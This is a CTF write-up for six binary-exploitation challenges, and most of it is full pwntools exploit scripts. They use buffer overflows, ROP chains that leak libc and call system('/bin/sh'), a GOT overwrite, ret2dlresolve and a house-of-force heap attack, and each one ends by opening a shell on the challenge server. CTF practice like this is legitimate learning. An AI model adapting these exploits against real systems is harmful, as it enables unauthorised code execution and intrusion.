
# hacktivity ctf pwn-writeups.

## Pancakes
Points - 75
How many flap-jacks are on your stack?

Connect with:
nc jh2i.com 50021

There was a buffer-overflow and a flag function,
so i return to that function.
##### here's the one-liner.
```py
python -c "from pwn import *;p = remote('jh2i.com', 50021);p.recv();p.sendline('A'*0x90+p64(0x40098B));p.interactive()
```
##### flag{too_many_pancakes_on_the_stack}.


## almost

Almost
100
Oh, just so close!

Connect here:
nc jh2i.com 50017

Another simple buffer-overflow, 32-bit with no-pie,
just simple ROP, leak libc and call system.
#### exploit
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
context.arch='i386'
exe = context.binary = ELF('./almost')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50017)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
b *0x80486C1
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil(':')
io.sendline('B'*0x100)
io.recvuntil(':')
io.sendline('B'*80)
io.recvuntil(':')
pause()
#leak libc, call main again
rop = flat([
	'D'*0x10,
	exe.sym.puts,
	exe.sym.main,
	exe.got['puts']
])
io.sendline(rop)
io.recvn(0x122)
libc_base = u32(io.recvn(4)) - 0x0673d0
log.info(hex(libc_base))
io.recvuntil(':')
io.sendline('B'*0x100)
io.recvuntil(':')
io.sendline('B'*80)
io.recvuntil(':')
pause()
#call system('/bin/sh')
rop = flat([
	'D'*0x10,
	libc_base+0x03cd80, #system
	0x41414141,
	libc_base+0x17bb8f #binsh string
])
io.sendline(rop)
#pop shell
io.interactive()
#flag{my_code_was_almost_secure}
```

## Statics and Dynamics
points - 100

Everybody likes the dynamic side of things, what about the static?

Connect with:
nc jh2i.com 50002


Static binary, No-pie, This was yet another bufferoverflow, i did execve('/bin/sh',NULL,NULL).
#### exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./sad')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50002)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
#gadgets
binsh = 0x483008
pop_rdi = 0x0047dd37
pop_rsi = 0x00464cf8
pop_rdx = 0x0040177f
pop_rax = 0x0043f8d7
syscall = 0x00475052
io.recvuntil('you need ;)\n')
rop = flat([
	'A'*0x100,
	'B'*8,
	pop_rdi,
	binsh,
	pop_rsi,
	0x0,
	pop_rdx,
	0x0,
	pop_rax,
	0x3b,
	syscall #do execve.
])
io.sendline(rop)
io.interactive()
#flag{radically_statically_roppingly_vulnerable}
```
## Bullseye
points - 150
You have one write, don't miss.

Connect with:
nc jh2i.com 50031

No-Pie, and Partial-Relro,
This challenge allowed us to write anything at anywhere into memory,
Got was partial-relro, exit() was called at the end, so i choose to overwrite exit() got with main, and binary prints a libc address,
find libc address with libc-database, we get another chance to overwrite this time i chose to overwrite strtoul with system.
and send '/bin/sh'.

#### exploit
```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./B')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50031)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil('write to?\n')
io.sendline(hex(exe.got['exit']))
io.recvuntil('write?\n')
io.sendline(hex(exe.sym.main))
libc_base = int(io.recvn(14),0) - 0x0e5be0

io.recvuntil('write to?\n')
io.sendline(hex(exe.got['strtoull']))
io.recvuntil('write?\n')
io.sendline(hex(libc_base+0x0554e0))

io.recvuntil('write to?\n')
io.sendline('/bin/sh\x00')
io.interactive()
#flag{one_write_two_write_good_write_bad_write}
```

## Bacon
points - 200
A breakfast isn't complete without bacon.

Connect with:
nc jh2i.com 50032

This was again yet anthor bufferoverflow, no-libc provided, no printfunction in the binary, NO-PIE, part-Relro, so i used ret2_dlresolve, There are lots of resources available for ret2_dlresolve.

#### exploit
```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./bacon')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50032)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

# -- Exploit goes here --

io = start()

resolver = 0x8049030
buf = 0x804ca00
leave_ret = 0x08049126
SYMTAB = 0x804820c
STRTAB = 0x80482ec
JMPREL = 0x8048408

buffer = b""
buffer += b"A"*0x408
buffer += p32(buf)
buffer += p32(exe.plt["read"]) + p32(leave_ret) + p32(0) + p32(buf) + p32(0x80) + b'AAAAAAAAAAAA'
print(hex(len(buffer)))

forged_ara = buf + 0x14
rel_offset = forged_ara - JMPREL
elf32_sym = forged_ara + 0x8

align = 0x10 - ((elf32_sym - SYMTAB) % 0x10)

elf32_sym = elf32_sym + align
index_sym = (elf32_sym - SYMTAB) // 0x10

r_info = (index_sym << 8) | 0x7

elf32_rel = p32(exe.got['read']) + p32(r_info)
st_name = (elf32_sym + 0x10) - STRTAB
elf32_sym_struct = p32(st_name) + p32(0) + p32(0) + p32(0x12)


buffer2 = b'AAAA'
buffer2 += p32(resolver)
buffer2 += p32(rel_offset)
buffer2 += b'AAAA'
buffer2 += p32(buf+100)
buffer2 += elf32_rel
buffer2 += b'A' * align
buffer2 += elf32_sym_struct
buffer2 += b"system\x00"
p = (100 - len(buffer2))
buffer2 += b'A' * p
buffer2 += b"sh\x00"
p = (0x80 - len(buffer2))
buffer2 += b"A" * p
pause()
io.send(buffer+buffer2)
#io.send(buffer2)
io.interactive()
# flag{don't_forget_to_take_out_the_grease}
```


## Space Force
points - 350
I wanna go to space!!!!!

Note: Be sure to use the provided libc.

Connect with:
nc jh2i.com 50016

This was a cool challenge, It was heap exploitation challenge. There was a heap overflow.

5- functions,
register_account, Delete_last_added, print_all, print_using_idx, lauchrocket :rocket: :face_with_open_mouth_vomiting: useless function.

register_account just malloc a chunk. which contained a heap overflow,

```c
struct chunk{
    char s[8];
    struct date *dates;
    char data[?];
    char *comment;
    int commentlen;
}
```
```c
struct date{
    int i;
    char month[0x10];
}
```
the size of month is 0x10, we can just overflow into the top-chunk, so i used house-of-force technique,
```c
    printf("Enter the month the account expires: ");
    fgets((char *)(*(long *)(param_1 + 2) + 8),0x20,stdin);
```
Here when it asks for month it takse 0x20 bytes. I failed to notice the bug and went for other bug in the binary, but that required 8 bits bruteforce, The remote server was very slow and takes lots of time.

The pointers to heap were located on stack and we could veiw the content using print_function.
Which didn't check for boundry of index.
So i leak libc address using print_uid function by giving index(38).

for heap leak, add three chunks, and view(-11).
This leaks heap address.

Now that's all, we have all we want.
I changed free-hook to system and free a chunk with containing '/bin/sh'.
About that, we can't have the rdi as pointer to '/bin/sh'.
The binary asks for 'comment' after we create account. The pointer is stored in the same struct.
The delete_acc function checks if there is a pointer to comment.
If there is then it frees that chunk. So we keep '/bin/sh'and free it. and pop the shell

My exploit is a bit unreliable, Might need to run it a few times.

#### exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys

exe = context.binary = ELF('./space')

host = args.HOST or 'jh2i.com'
port = int(args.PORT or 50016)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv,aslr=True, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()

def make(fname,lname,fuck,fuck2,year=1992,month=2000,day=0,commentlen=10,comment=''):
	io.sendlineafter('> ','1')
	io.sendlineafter('name: ',fname)
	io.sendlineafter('name: ',lname)
	io.sendlineafter('[y]: ',fuck[0])
	if fuck[0]=='y':
		io.sendlineafter(':',str(year))
		io.sendlineafter(':',str(month))
		io.sendlineafter(':',str(day))
	io.sendlineafter('[y]: ',fuck2[0])
	if fuck2[0] == 'y':
		io.sendlineafter(':',str(commentlen))
		io.sendlineafter(':',comment)
	io.sendlineafter('[y/n]','n')

def delete():
	io.sendlineafter('> ','4')
	io.sendlineafter('[y/n]','n')

def show(idx):
	io.sendlineafter('> ', '3')
	io.sendlineafter('user: ',str(idx))

def launch():
	io.sendlineafter('> ','5')
	io.sendlineafter('[y/n]','n')

def return_size(target, wilderness):
    return target - wilderness - 0x10

#offsets
mainarena_offset = 0x3ebc40
free_hook = 0x3ed8e8
malloc_hook = 0x3ebc30
system = 0x4f4e0
#leak libc
show(38)
io.recvuntil('Last name: ')
libc_base = u64(io.recvn(6)+'\x00\x00') - (0x7fe48aceb8d0 - 0x7fe48ab51000)
log.info('Libc base {}'.format(hex(libc_base)))
io.sendlineafter('[y/n]','n')
#leak heap
for i in range(3):
	make('HKHK','HKHK','n','n')
show(-11)
io.recvuntil('First name: ')
heap_base = u64(io.recvn(6)+'\x00\x00') - 0x380
log.info('Heap base {}'.format(hex(heap_base)))
make('HKHK','HKHK','y','n',year=0x10,month='A'*0x10+p64(0xffffffffffffffff),day=10)
make('HKHK','HKHK','n','y',commentlen=return_size(libc_base + free_hook-0xe0,heap_base+0x498),comment='AAAAAA')
make('',p64(0x0)+p64(0x0)+p64(0x0)+p64(libc_base+system),'n','n')
io.sendlineafter('[y/n]','n')
make('HKHK','HKHK','n','y',commentlen=0x20,comment='/bin/sh\x00')
io.sendlineafter('> ','4')
io.sendline('cat flag.txt')
io.interactive()
#flag{michael_scott_for_president}
```


